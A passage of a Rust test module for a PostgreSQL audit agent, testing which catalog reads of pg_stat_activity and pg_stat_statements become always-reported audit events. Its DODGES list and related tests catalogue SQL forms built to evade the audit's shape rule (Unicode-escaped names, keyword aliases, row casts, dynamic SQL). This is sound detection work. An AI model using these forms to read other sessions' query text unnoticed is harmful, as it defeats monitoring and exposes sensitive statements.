                assert!(ev[0].always_report());
                assert_eq!(objects_of(&ev[0]), ["shop..*"], "{text}");
                assert!(charged_keys(&usage).is_empty());
            }
            for app in ["psql", crate::conn::APPLICATION_NAME] {
                let mut b = PgauditEvents::new(own());
                b.set_catalogs(shop_catalogs(Some(true)));
                let ev = b.convert(
                    vec![rec("b2", 1, 1, "READ", "SELECT", "", &text, Some(1), app)],
                    SystemTime::now(),
                );
                assert_eq!(ev.len(), 1, "{app}: {text}");
                assert!(ev[0].always_report());
                assert_eq!(objects_of(&ev[0]), ["shop..*"], "{text}");
            }
        }
        // Security re-review of #199, N-L1: a record names the application
        // table, `log_catalog = on` but no `pg_catalog` record for the
        // statement, and the text is at the bound: `*`, always reported.
        let text = format!(
            "select * from crm.customer, {}, pg_stats",
            catalogs[..15].join(", ")
        );
        for app in ["psql", crate::conn::APPLICATION_NAME] {
            let usage = SharedOwnUsage::default();
            let mut b = PgauditEvents::new(own_with(
                ClientAddr::parse("192.0.2.14"),
                1000,
                usage.clone(),
            ));
            b.set_catalogs(shop_catalogs(Some(true)));
            let ev = b.convert(
                vec![rec(
                    "b3",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    "crm.customer",
                    &text,
                    Some(1),
                    app,
                )],
                SystemTime::now(),
            );
            assert_eq!(ev.len(), 1, "{app}");
            assert!(ev[0].always_report(), "{app}");
            let objects = objects_of(&ev[0]);
            assert!(objects.iter().any(|o| o == "shop..*"), "{objects:?}");
            assert!(
                objects.iter().any(|o| o == "shop.crm.customer"),
                "{objects:?}"
            );
            assert!(charged_keys(&usage).is_empty(), "{app}");
        }
        // With `pg_catalog` records for the statement, the records decide.
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let ev = b.convert(
            vec![
                rec(
                    "b4",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    "crm.customer",
                    &text,
                    Some(1),
                    "psql",
                ),
                rec(
                    "b4",
                    1,
                    1,
                    "READ",
                    "SELECT",
                    "pg_catalog.pg_stats",
                    &text,
                    Some(1),
                    "psql",
                ),
            ],
            SystemTime::now(),
        );
        assert_eq!(
            objects_of(&ev[0]),
            ["shop.crm.customer", "shop.pg_catalog.pg_stats"]
        );
        // Security re-review of #199, N-L2: a `CREATE TABLE … AS` at the
        // bound adds `*`, always reported, on `pg_stat_statements` and on
        // pgaudit (with or without a record naming the new table).
        let text = format!(
            "create table crm.x as select * from {}, pg_stats",
            catalogs.join(", ")
        );
        for user in ["app", "databastion"] {
            let usage = SharedOwnUsage::default();
            let a = analyze_pss(&text, false);
            let deltas = [StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user,
                database: "shop",
                analysis: &a,
                calls: 1,
                rows: 0,
            }];
            let t0 = SystemTime::UNIX_EPOCH;
            let ev = pss_events(
                &deltas,
                &mut own_with(None, 1000, usage.clone()),
                &shop_catalogs(None),
                t0,
                t0,
            );
            assert_eq!(ev.len(), 1, "{user}");
            assert_eq!(ev[0].action(), EventAction::Ddl);
            assert!(ev[0].always_report(), "{user}");
            assert!(
                objects_of(&ev[0]).iter().any(|o| o == "shop..*"),
                "{:?}",
                objects_of(&ev[0])
            );
            assert!(charged_keys(&usage).is_empty());
        }
        for log_catalog in [Some(true), Some(false), None] {
            for object in ["crm.x", ""] {
                let mut b = PgauditEvents::new(own());
                b.set_catalogs(shop_catalogs(log_catalog));
                let ev = b.convert(
                    vec![rec(
                        "b5",
                        1,
                        1,
                        "DDL",
                        "CREATE TABLE AS",
                        object,
                        &text,
                        None,
                        "psql",
                    )],
                    SystemTime::now(),
                );
                assert_eq!(ev.len(), 1, "{log_catalog:?} {object}");
                assert_eq!(ev[0].action(), EventAction::Ddl);
                assert!(ev[0].always_report(), "{log_catalog:?} {object}");
                assert!(
                    objects_of(&ev[0]).iter().any(|o| o == "shop..*"),
                    "{log_catalog:?} {object}: {:?}",
                    objects_of(&ev[0])
                );
            }
        }
        // Below the bound: no `*`.
        let a = analyze_pss("select * from crm.a, crm.b, pg_stats", false);
        let deltas = [StatementDelta {
            reads: &NO_READS,
            own_text: false,
            user: "app",
            database: "shop",
            analysis: &a,
            calls: 1,
            rows: 1,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0);
        assert!(!objects_of(&ev[0]).iter().any(|o| o.ends_with('*')));
    }

    /// Security review of #199, M2: a `U&"…"` name is compared decoded, and
    /// a read of unknown objects (`*`, a function that runs SQL) is always
    /// reported on both sources, never dropped by `min_rows`.
    #[test]
    fn unicode_names_and_unknown_objects() {
        for text in [
            r#"select * from U&"\0070g_stats""#,
            r#"select * from pg_catalog.U&"pg_st!0061ts" UESCAPE '!'"#,
        ] {
            let a = analyze_pss(text, false);
            let deltas = [StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "app",
                database: "shop",
                analysis: &a,
                calls: 1,
                rows: 1,
            }];
            let t0 = SystemTime::UNIX_EPOCH;
            let ev = pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0);
            assert_eq!(objects_of(&ev[0]), ["shop.pg_catalog.pg_stats"], "{text}");
            assert!(ev[0].always_report());
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(Some(true)));
            let ev = b.convert(
                vec![rec("u1", 1, 1, "READ", "SELECT", "", text, Some(1), "psql")],
                SystemTime::now(),
            );
            assert_eq!(objects_of(&ev[0]), ["shop.pg_catalog.pg_stats"], "{text}");
            assert!(ev[0].always_report());
        }
        let text = "select query_to_xml('select * from pg_stats', true, false, '')";
        for user in ["app", "databastion"] {
            let a = analyze_pss(text, false);
            let deltas = [StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user,
                database: "shop",
                analysis: &a,
                calls: 1,
                rows: 1,
            }];
            let t0 = SystemTime::UNIX_EPOCH;
            let ev = pss_events(&deltas, &mut own(), &shop_catalogs(None), t0, t0);
            assert_eq!(ev.len(), 1, "{user}");
            assert_eq!(objects_of(&ev[0]), ["shop..*"]);
            assert!(ev[0].always_report(), "{user}");
        }
        let mut b = PgauditEvents::new(own());
        let ev = b.convert(
            vec![rec("u2", 1, 1, "READ", "SELECT", "", text, Some(1), "psql")],
            SystemTime::now(),
        );
        assert_eq!(objects_of(&ev[0]), ["shop..*"]);
        assert!(ev[0].always_report());
    }

    // ------------------------------------------------- ADR-0049 unit tests

    /// The `pg_stat_statements` events of `text` (as stored, `cut` when at
    /// the read bound) run by `user` in `shop` (extension in `public`),
    /// with the reads decided as the poller does.
    fn pss_text_events(
        text: &str,
        user: &str,
        cut: bool,
        own: &mut PgOwn,
        own_text: bool,
    ) -> Vec<MaskedEvent> {
        let catalogs = shop_catalogs(None);
        let a = analyze_pss(text, cut);
        let none = HashSet::new();
        let reads = text_reads(text, &a, catalogs.rule("shop", true, &none), cut);
        let deltas = [StatementDelta {
            reads: &reads,
            own_text,
            user,
            database: "shop",
            analysis: &a,
            calls: 3,
            rows: 2,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        pss_events(&deltas, own, &catalogs, t0, t0)
    }

    /// The pgaudit events of one record of `text` (no relation object:
    /// `log_relation` off, the text decides).
    fn pgaudit_text_events(
        text: &str,
        class: &str,
        command: &str,
        app: &str,
        log_catalog: Option<bool>,
        own: PgOwn,
    ) -> Vec<MaskedEvent> {
        let mut b = PgauditEvents::new(own);
        b.set_catalogs(shop_catalogs(log_catalog));
        b.convert(
            vec![rec("t1", 1, 1, class, command, "", text, Some(2), app)],
            SystemTime::now(),
        )
    }

    /// Catalog facts of `shop` with a collision probe that found `rows`
    /// (kind, name), on PostgreSQL 16.
    fn probed_catalogs(rows: &[(&str, &str)]) -> Catalogs {
        let names = super::super::user_code::ProbeNames::from_rows(
            rows.iter().map(|(k, n)| ((*k).to_owned(), (*n).to_owned())),
        )
        .unwrap();
        let shared = super::super::user_code::SharedUserCode::default();
        super::super::user_code::lock(&shared).store("shop", Instant::now(), 160_013, Some(names));
        shop_catalogs(Some(true)).with_user_code(UserCodeHandle::new(shared))
    }

    /// Events of one pgaudit record (`app`: its application; the agent's
    /// own address) with probed catalogs.
    fn probed_pgaudit(
        text: &str,
        class: &str,
        command: &str,
        app: &str,
        rows: &[(&str, &str)],
    ) -> Vec<MaskedEvent> {
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(probed_catalogs(rows));
        b.convert(
            vec![rec("t1", 1, 1, class, command, "", text, Some(2), app)],
            SystemTime::now(),
        )
    }

    /// Events of one `pg_stat_statements` delta with probed catalogs.
    fn probed_pss(
        text: &str,
        user: &str,
        own_connector: bool,
        rows: &[(&str, &str)],
    ) -> Vec<MaskedEvent> {
        let catalogs = probed_catalogs(rows);
        let a = analyze_pss(text, false);
        let none = HashSet::new();
        let mut reads = text_reads(text, &a, catalogs.rule("shop", true, &none), false);
        reads.own_connector = own_connector;
        let deltas = [StatementDelta {
            reads: &reads,
            own_text: false,
            user,
            database: "shop",
            analysis: &a,
            calls: 1,
            rows: 1,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        pss_events(&deltas, &mut own(), &catalogs, t0, t0)
    }

    fn is_star(ev: &[MaskedEvent]) -> bool {
        ev.len() == 1 && ev[0].always_report() && objects_of(&ev[0]).contains(&"shop..*".to_owned())
    }

    /// Security review of #211, H1: the statements that wrap a query run
    /// (or plan, folding immutable and stable calls) the code of their
    /// query: user code there is `*` too, on both sources, in the class
    /// pgaudit logs it (a `CREATE … AS` also gets its DDL record).
    #[test]
    fn wrapped_queries_run_user_code() {
        for (text, class, command) in [
            (
                "PREPARE p AS SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "PREPARE",
            ),
            (
                "PREPARE p AS SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "SELECT",
            ),
            (
                "EXPLAIN ANALYZE SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "SELECT",
            ),
            (
                "EXPLAIN SELECT public.f(1) FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "SELECT",
            ),
            (
                "EXPLAIN (ANALYZE, FORMAT JSON) SELECT public.f() FROM pg_catalog.pg_class",
                "READ",
                "SELECT",
            ),
            (
                "DECLARE c CURSOR FOR SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "DECLARE CURSOR",
            ),
            (
                "CREATE TEMP TABLE tt AS SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "READ",
                "SELECT",
            ),
            (
                "CREATE TEMP TABLE tt AS SELECT public.f() FROM pg_catalog.pg_class LIMIT 1",
                "DDL",
                "CREATE TABLE AS",
            ),
            (
                "CREATE MATERIALIZED VIEW mv AS SELECT public.f() FROM pg_catalog.pg_class",
                "READ",
                "SELECT",
            ),
            (
                "CREATE MATERIALIZED VIEW mv AS SELECT public.f() FROM pg_catalog.pg_class",
                "DDL",
                "CREATE MATERIALIZED VIEW",
            ),
        ] {
            assert_text_read(text, class, command, &["shop..*"], true);
        }
        // An unqualified collision behind each wrapper, and quiet without it.
        for text in [
            "PREPARE p AS SELECT length(42) FROM pg_catalog.pg_class LIMIT 1",
            "EXPLAIN ANALYZE SELECT length(42) FROM pg_catalog.pg_class LIMIT 1",
            "EXPLAIN SELECT length(42) FROM pg_catalog.pg_class LIMIT 1",
            "DECLARE c CURSOR FOR SELECT length(42) FROM pg_catalog.pg_class LIMIT 1",
            "CREATE TEMP TABLE tt AS SELECT length(42) FROM pg_catalog.pg_class LIMIT 1",
            "CREATE MATERIALIZED VIEW mv AS SELECT length(42) FROM pg_catalog.pg_class",
        ] {
            let colliding = [("f", "length")];
            assert!(
                is_star(&probed_pgaudit(text, "READ", "SELECT", "psql", &colliding)),
                "{text}"
            );
            assert!(
                is_star(&probed_pss(text, "app", false, &colliding)),
                "{text}"
            );
            // Without the collision: no `*` (a `CREATE … AS` stays a DDL
            // event on pg_stat_statements).
            let no_star = |ev: Vec<MaskedEvent>| {
                !ev.iter()
                    .any(|e| objects_of(e).contains(&"shop..*".to_owned()))
            };
            assert!(
                no_star(probed_pgaudit(text, "READ", "SELECT", "psql", &[])),
                "{text}"
            );
            assert!(no_star(probed_pss(text, "app", false, &[])), "{text}");
        }
        // Any other statement of a catalog-only text is scanned whole.
        assert!(is_star(&probed_pss(
            "SELECT 1 FROM pg_catalog.pg_class; SET search_path TO my_f(1)",
            "app",
            false,
            &[]
        )));
    }

    /// Security review of #211, M1: a bound parameter in a database with a
    /// user domain whose `CHECK` runs non-C code is `*`, except the
    /// connector's own statement by exact text from the agent's identity.
    #[test]
    fn parameters_next_to_a_checked_domain() {
        let domain = [("d", "")];
        let own_stmt = sql::OWN_OIDS;
        // pgaudit: the agent (its application and address), exact text.
        assert!(
            probed_pgaudit(
                own_stmt,
                "READ",
                "SELECT",
                crate::conn::APPLICATION_NAME,
                &domain
            )
            .is_empty()
        );
        // The same text from another client, or a changed text.
        assert!(is_star(&probed_pgaudit(
            own_stmt, "READ", "SELECT", "psql", &domain
        )));
        let changed = own_stmt.replace(" FROM ", "  FROM ");
        assert!(is_star(&probed_pgaudit(
            &changed,
            "READ",
            "SELECT",
            crate::conn::APPLICATION_NAME,
            &domain
        )));
        let other =
            "SELECT relname FROM pg_catalog.pg_class WHERE relname OPERATOR(pg_catalog.=) $1";
        assert!(is_star(&probed_pgaudit(
            other, "READ", "SELECT", "psql", &domain
        )));
        // Without the domain, or without a parameter: quiet.
        assert!(probed_pgaudit(other, "READ", "SELECT", "psql", &[]).is_empty());
        assert!(
            probed_pgaudit(
                "SELECT relname FROM pg_catalog.pg_class",
                "READ",
                "SELECT",
                "psql",
                &domain
            )
            .is_empty()
        );
        // pg_stat_statements: the poller's exact-text and slot decision.
        assert!(probed_pss(other, "databastion", true, &domain).is_empty());
        assert!(is_star(&probed_pss(other, "databastion", false, &domain)));
        // The connector's exact texts are recognized as stored.
        let p = own();
        for c in sql::connector_statements() {
            assert!(p.connector_sent(&c, Some("public")), "{c}");
            if let Some(f) = pss_form(&c) {
                assert!(p.connector_pss_form(&f, Some("public")), "{c}");
            }
        }
        let counters = sql::pss_counters("public", true).unwrap();
        assert!(p.connector_pss_form(&pss_form(&counters).unwrap(), Some("public")));
        assert!(!p.connector_sent(&counters, None));
        assert!(!p.connector_sent(other, Some("public")));
    }

    const ACTIVITY: &str = "shop.pg_catalog.pg_stat_activity";
    const PSS: &str = "shop.public.pg_stat_statements";

    /// `text` is a text read naming `want` (and maybe other objects), always
    /// reported, on every source, from any account; the agent's never left
    /// out nor charged. `pss`: also check `pg_stat_statements` (not for a
    /// `DO` block, which gives no event there).
    fn assert_text_read(text: &str, class: &str, command: &str, want: &[&str], pss: bool) {
        for log_catalog in [Some(true), Some(false), None] {
            for app in ["psql", crate::conn::APPLICATION_NAME] {
                let usage = SharedOwnUsage::default();
                let ev = pgaudit_text_events(
                    text,
                    class,
                    command,
                    app,
                    log_catalog,
                    own_with(ClientAddr::parse("192.0.2.14"), 1000, usage.clone()),
                );
                assert_eq!(ev.len(), 1, "{app} {log_catalog:?}: {text}");
                let objects = objects_of(&ev[0]);
                for w in want {
                    assert!(
                        objects.contains(&(*w).to_owned()),
                        "{app} {log_catalog:?}: {text}: {objects:?}"
                    );
                }
                assert!(ev[0].always_report(), "{app}: {text}");
                assert!(charged_keys(&usage).is_empty(), "{app}: {text}");
            }
        }
        if pss {
            for user in ["app", "databastion"] {
                let usage = SharedOwnUsage::default();
                let mut own = own_with(None, 1000, usage.clone());
                let ev = pss_text_events(text, user, false, &mut own, false);
                assert_eq!(ev.len(), 1, "{user}: {text}");
                let objects = objects_of(&ev[0]);
                for w in want {
                    assert!(
                        objects.contains(&(*w).to_owned()),
                        "{user}: {text}: {objects:?}"
                    );
                }
                assert!(ev[0].always_report(), "{user}: {text}");
                assert!(charged_keys(&usage).is_empty(), "{user}: {text}");
            }
        }
    }

    /// `text` gives no event on either source (pgaudit with `log_catalog`
    /// on or unknown, the text deciding), for any account.
    fn assert_quiet(text: &str) {
        for log_catalog in [Some(true), None] {
            for app in ["psql", crate::conn::APPLICATION_NAME] {
                let ev = pgaudit_text_events(text, "READ", "SELECT", app, log_catalog, own());
                assert!(
                    ev.is_empty(),
                    "{app} {log_catalog:?}: {text}: {:?}",
                    ev.iter().map(json).collect::<Vec<_>>()
                );
            }
        }
        for user in ["app", "databastion"] {
            let ev = pss_text_events(text, user, false, &mut own(), false);
            assert!(
                ev.is_empty(),
                "{user}: {text}: {:?}",
                ev.iter().map(json).collect::<Vec<_>>()
            );
        }
    }

    /// ADR-0049 decision 1: each core-list entry, qualified, unqualified,
    /// `U&`-escaped, in a join with an application table, a subquery, a
    /// CTE, a `DO` body, a `COPY (…) TO` and a `CREATE TABLE … AS`, is a
    /// text read naming its view; look-alikes are ordinary relations.
    #[test]
    fn statement_text_entries_in_every_form() {
        let views: [(&str, &str); 7] = [
            ("pg_catalog.pg_stat_activity", ACTIVITY),
            ("pg_stat_activity", ACTIVITY),
            (r#"U&"\0070g_stat_activity""#, ACTIVITY),
            (
                "pg_catalog.U&\"pg_st!0061t_activity\" UESCAPE '!'",
                ACTIVITY,
            ),
            ("public.pg_stat_statements", PSS),
            ("\"public\".pg_stat_statements", PSS),
            ("pg_stat_statements", PSS),
        ];
        let functions: [(&str, &str); 4] = [
            ("pg_catalog.pg_stat_get_activity(NULL)", ACTIVITY),
            ("pg_stat_get_activity(NULL)", ACTIVITY),
            ("public.pg_stat_statements(true)", PSS),
            ("pg_stat_statements(true)", PSS),
        ];
        let mut forms: Vec<(String, &str)> = Vec::new();
        for (v, o) in views {
            forms.push((
                v.split(" UESCAPE")
                    .next()
                    .map_or(String::new(), |_| v.to_owned()),
                o,
            ));
        }
        for (f, o) in functions {
            forms.push((f.to_owned(), o));
        }
        for (q, o) in &forms {
            assert_text_read(
                &format!("SELECT x.query FROM {q} x"),
                "READ",
                "SELECT",
                &[o],
                true,
            );
            assert_text_read(
                &format!("SELECT c.email, x.pid FROM crm.customer c JOIN {q} x ON true"),
                "READ",
                "SELECT",
                &[o, "shop.crm.customer"],
                true,
            );
            assert_text_read(
                &format!("SELECT * FROM crm.customer WHERE email IN (SELECT x.query FROM {q} x)"),
                "READ",
                "SELECT",
                &[o, "shop.crm.customer"],
                true,
            );
            assert_text_read(
                &format!("WITH w AS (SELECT x.query FROM {q} x) SELECT w.query FROM w"),
                "READ",
                "SELECT",
                &[o],
                true,
            );
            assert_text_read(
                &format!("DO $$ BEGIN PERFORM x.query FROM {q} x; END $$"),
                "READ",
                "SELECT",
                &[o],
                false,
            );
            assert_text_read(
                &format!("COPY (SELECT x.query FROM {q} x) TO STDOUT"),
                "READ",
                "COPY",
                &[o],
                true,
            );
            assert_text_read(
                &format!("CREATE TABLE crm.t AS SELECT x.query FROM {q} x"),
                "DDL",
                "CREATE TABLE AS",
                &[o],
                true,
            );
            assert_text_read(
                &format!("INSERT INTO crm.t SELECT x.query FROM {q} x"),
                "WRITE",
                "INSERT",
                &[o],
                true,
            );
        }
        // The scalar function: always a text read, named by the view, also
        // table-less (no `*`).
        for text in [
            "SELECT pg_stat_get_backend_activity(1)",
            "SELECT pg_catalog.pg_stat_get_backend_activity(b) FROM pg_stat_get_backend_idset() b",
        ] {
            assert_text_read(text, "READ", "SELECT", &[ACTIVITY], true);
            let ev = pgaudit_text_events(text, "READ", "SELECT", "psql", Some(true), own());
            assert_eq!(objects_of(&ev[0]), [ACTIVITY], "{text}");
            let ev = pss_text_events(text, "app", false, &mut own(), false);
            assert_eq!(objects_of(&ev[0]), [ACTIVITY], "{text}");
        }
        // Look-alikes: a quoted upper-case name, another schema, a
        // `pg_stat_statements` outside the extension's schema: ordinary
        // relations (not always reported).
        for (text, object) in [
            (
                "SELECT query FROM \"PG_STAT_ACTIVITY\"",
                "shop..PG_STAT_ACTIVITY",
            ),
            (
                "SELECT query FROM public.pg_stat_activity",
                "shop.public.pg_stat_activity",
            ),
            (
                "SELECT query FROM crm.pg_stat_statements",
                "shop.crm.pg_stat_statements",
            ),
        ] {
            let ev = pgaudit_text_events(text, "READ", "SELECT", "psql", Some(true), own());
            assert_eq!(objects_of(&ev[0]), [object], "{text}");
            assert!(!ev[0].always_report(), "{text}");
            let ev = pss_text_events(text, "app", false, &mut own(), false);
            assert_eq!(objects_of(&ev[0]), [object], "{text}");
            assert!(!ev[0].always_report(), "{text}");
        }
        // An unqualified `pg_stat_statements(` where the extension is not
        // installed: a user function, `*`.
        let mut b = PgauditEvents::new(own());
        let ev = b.convert(
            vec![rec(
                "t2",
                1,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_class",
                "SELECT s.calls FROM pg_stat_statements(true) s, pg_class c",
                Some(1),
                "psql",
            )],
            SystemTime::now(),
        );
        assert_eq!(objects_of(&ev[0]), ["shop..*"]);
        assert!(ev[0].always_report());
        // `pg_stat_statements_info` stays a catalog.
        assert_quiet("SELECT dealloc FROM public.pg_stat_statements_info");
    }

    /// ADR-0049 decision 1, extension list: in any schema or unqualified,
    /// with or without a shape-like text, a text read named as the text
    /// gives it; a call `*`.
    #[test]
    fn extension_list_names_are_text_reads() {
        for (text, want) in [
            (
                "SELECT count(*) FROM pg_stat_monitor",
                "shop..pg_stat_monitor",
            ),
            (
                "SELECT bucket FROM pmm.pg_stat_monitor",
                "shop.pmm.pg_stat_monitor",
            ),
            (
                "SELECT queryid FROM pg_qualstats_all",
                "shop..pg_qualstats_all",
            ),
            (
                "SELECT 1 FROM public.pg_qualstats",
                "shop.public.pg_qualstats",
            ),
            ("SELECT queryid FROM pg_store_plans", "shop..pg_store_plans"),
            (
                "SELECT pid FROM ext.pg_show_plans",
                "shop.ext.pg_show_plans",
            ),
            ("SELECT pg_qualstats_example_query(1)", "shop..*"),
            (
                "SELECT x.y FROM pg_qualstats_pretty() x, pg_class",
                "shop..*",
            ),
        ] {
            assert_text_read(text, "READ", "SELECT", &[want], true);
        }
    }

    /// The common monitoring reads and the shape-respecting forms of
    /// decision 2: no event on either source, for any account.
    const QUIET: [&str; 13] = [
        "SELECT state, count(*) FROM pg_stat_activity GROUP BY state",
        "SELECT pid FROM pg_stat_activity WHERE state = 'idle'",
        "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE state = 'idle' \
         AND state_change < now() - interval '10 minutes'",
        "SELECT queryid, calls FROM pg_stat_statements",
        "SELECT s.queryid, s.calls FROM public.pg_stat_statements(false) AS s",
        "SELECT a.pid, d.datname FROM pg_catalog.pg_stat_activity a \
         JOIN pg_catalog.pg_database d ON d.oid = a.datid",
        "SELECT s.pid FROM pg_stat_get_activity(NULL) s",
        "SELECT r.pid FROM ROWS FROM (pg_stat_get_activity(NULL)) WITH ORDINALITY AS r",
        // The join-using alias exposes the `USING` columns only (verified on
        // PostgreSQL 16).
        "SELECT j.pid FROM pg_stat_activity a JOIN pg_stat_activity b USING (pid) AS j",
        // postgres_exporter's activity query (refinement of 2026-10-11).
        "SELECT pg_database.datname, tmp.state, COALESCE(count,0) as count, \
         COALESCE(max_tx_duration,0) as max_tx_duration FROM ( VALUES ('active'), ('idle'), \
         ('idle in transaction'), ('idle in transaction (aborted)'), ('fastpath function call'), \
         ('disabled') ) AS tmp(state) CROSS JOIN pg_database LEFT JOIN ( SELECT datname, state, \
         count(*) AS count, MAX(EXTRACT(EPOCH FROM now() - xact_start))::float AS max_tx_duration \
         FROM pg_stat_activity GROUP BY datname,state) AS tmp2 ON tmp.state = tmp2.state \
         AND pg_database.datname = tmp2.datname",
        "SELECT count(*) FROM pg_catalog.pg_stat_activity WHERE backend_type = 'client backend'",
        "SELECT CAST(pid AS numeric(10, 0)) FROM pg_stat_activity",
        // A `pg_catalog`-qualified call is no user function (M1).
        "SELECT pg_catalog.pg_terminate_backend(a.pid) FROM pg_stat_activity a",
    ];

    /// Every way decision 2 refuses (each condition broken alone): a text
    /// read of `pg_catalog.pg_stat_activity`.
    const DODGES: [&str; 48] = [
        "SELECT query FROM pg_stat_activity",
        "SELECT \"query\" FROM pg_stat_activity",
        r#"SELECT U&"\0071uery" FROM pg_stat_activity"#,
        "SELECT query(a) FROM pg_stat_activity a",
        "SELECT count(*) FILTER (WHERE query LIKE '%x%') FROM pg_stat_activity",
        "SELECT * FROM pg_stat_activity",
        "SELECT a.* FROM pg_stat_activity a",
        "SELECT row_to_json(a) FROM pg_stat_activity a",
        "SELECT a::text FROM pg_stat_activity a",
        "SELECT (a).* FROM pg_stat_activity a",
        "SELECT a FROM pg_stat_activity a",
        "SELECT pg_catalog.pg_stat_activity FROM pg_catalog.pg_stat_activity",
        "SELECT row_to_json(pg_stat_get_activity) FROM pg_stat_get_activity(NULL)",
        "SELECT pg_stat_get_activity::text FROM pg_catalog.pg_stat_get_activity(NULL)",
        "SELECT row_to_json(pg_stat_get_activity) FROM ROWS FROM (pg_stat_get_activity(NULL))",
        "SELECT pg_stat_get_activity::text FROM ROWS FROM (pg_catalog.pg_stat_get_activity(NULL))",
        "SELECT row_to_json(pg_stat_get_activity) FROM pg_stat_get_activity(NULL) WITH ORDINALITY",
        "SELECT pg_stat_get_activity::text FROM pg_stat_get_activity(NULL) WITH ORDINALITY",
        // Over-reported, never missed.
        "SELECT state FROM pg_stat_activity state",
        "SELECT NULL::pg_stat_activity FROM pg_stat_activity",
        // Column alias lists.
        "SELECT a.c FROM pg_stat_activity AS a (c, d, e)",
        "SELECT x.c FROM (SELECT a.pid FROM pg_stat_activity a) x (c)",
        "SELECT j.c FROM (pg_stat_activity a CROSS JOIN pg_database d) AS j (c)",
        "SELECT s.c FROM pg_stat_get_activity(NULL) AS s (c)",
        "SELECT r.c FROM ROWS FROM (pg_stat_get_activity(NULL)) AS r (c)",
        "SELECT r.c FROM pg_stat_get_activity(NULL) WITH ORDINALITY AS r (c, n)",
        "WITH x (c) AS (SELECT a.pid FROM pg_stat_activity a) SELECT x.c FROM x",
        // A parenthesized join's alias read whole.
        "SELECT row_to_json(j) FROM (pg_stat_activity a CROSS JOIN pg_database d) j",
        "SELECT b.pid FROM pg_stat_activity a NATURAL JOIN pg_stat_activity b",
        "TABLE pg_stat_activity",
        "SELECT pg_stat_get_activity(NULL)",
        "SELECT pg_stat_get_backend_activity(1) FROM pg_stat_activity",
        // The text decides only on catalogs and listed entries (N2).
        "SELECT a.pid FROM pg_stat_activity a, public.v",
        "SELECT a.pid FROM pg_stat_activity a, public.f() f",
        "SELECT a.pid FROM pg_stat_activity a, pg_catalog.pg_stats s",
        "SELECT a.pid FROM pg_stat_activity a WHERE a IS DISTINCT FROM NULL",
        "SELECT 1 FROM pg_stat_activity, (VALUES ((SELECT 1))) AS v (c)",
        // Security review H1: keyword aliases with a column alias list.
        "SELECT zone.c7 FROM pg_stat_activity zone (c1, c2, c3, c4, c5, c6, c7)",
        "SELECT filter.c FROM pg_stat_activity filter (c)",
        "SELECT zone.c FROM pg_stat_activity AS zone (c)",
        "SELECT second.c FROM pg_stat_get_activity(NULL) AS second (c)",
        "SELECT columns.c FROM (pg_stat_activity a CROSS JOIN pg_database d) columns (c)",
        "SELECT set.c FROM pg_stat_activity AS set (c)",
        "SELECT call.c FROM pg_stat_activity call (c)",
        "SELECT v.c FROM pg_stat_activity values (c)",
        // Security review M1: a schema-qualified user function in the
        // select list, until decision 8.
        "SELECT a.pid, public.f() FROM pg_stat_activity a",
        "SELECT a.pid FROM pg_stat_activity a WHERE app.check(a.pid)",
        "SELECT \"Ops\".f(a.pid) FROM pg_catalog.pg_stat_activity a",
    ];

    /// ADR-0049 decision 2: the quiet shapes give no event; each refused
    /// form is a text read, always reported, never charged to the agent.
    #[test]
    fn the_no_text_shape_and_its_dodges() {
        for text in QUIET {
            assert_quiet(text);
        }
        for text in DODGES {
            assert_text_read(text, "READ", "SELECT", &[ACTIVITY], true);
        }
        // A cut text (at the read bound of `pg_stat_statements`), and a
        // text at the analyzer's relation bound, are text reads.
        let ev = pss_text_events(QUIET[0], "app", true, &mut own(), false);
        assert!(objects_of(&ev[0]).contains(&ACTIVITY.to_owned()));
        let many: Vec<String> = (0..20).map(|i| format!("pg_catalog.t{i}")).collect();
        let bound = format!("SELECT a.pid FROM {}, pg_stat_activity a", many.join(", "));
        assert_text_read(&bound, "READ", "SELECT", &["shop..*"], true);
        // A `<previously logged>` record whose first record is not read:
        // no text, so the relation records decide (decision 3).
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let ev = b.convert(
            vec![rec(
                "t3",
                1,
                1,
                "READ",
                "SELECT",
                "pg_catalog.pg_stat_activity",
                PREVIOUSLY_LOGGED,
                Some(1),
                "psql",
            )],
            SystemTime::now(),
        );
        assert_eq!(objects_of(&ev[0]), [ACTIVITY]);
        assert!(ev[0].always_report());
    }

    /// A `DO` block running dynamic SQL: reported only through pgaudit's
    /// substatement record of the generated text; on `pg_stat_statements`
    /// the `DO` gives no event (an existing residual).
    #[test]
    fn dynamic_sql_in_a_do_block() {
        let block =
            "DO $$ BEGIN EXECUTE format('SELECT %I FROM pg_stat_activity', 'que' || 'ry'); END $$";
        let mut b = PgauditEvents::new(own());
        b.set_catalogs(shop_catalogs(Some(true)));
        let ev = b.convert(
            vec![
                rec("t4", 1, 1, "FUNCTION", "DO", "", block, None, "psql"),
                rec(
                    "t4",
                    1,
                    2,
                    "READ",
                    "SELECT",
                    "",
                    "SELECT query FROM pg_stat_activity",
                    Some(3),
                    "psql",
                ),
            ],
            SystemTime::now(),
        );
        assert_eq!(objects_of(&ev[0]), [ACTIVITY]);
        assert!(ev[0].always_report());
        assert!(pss_text_events(block, "app", false, &mut own(), false).is_empty());
    }

    /// One pgaudit record of class `READ` naming `object` of `object_type`.
    fn obj_rec(sub: u64, object: &str, object_type: &str, text: &str) -> AuditRecord {
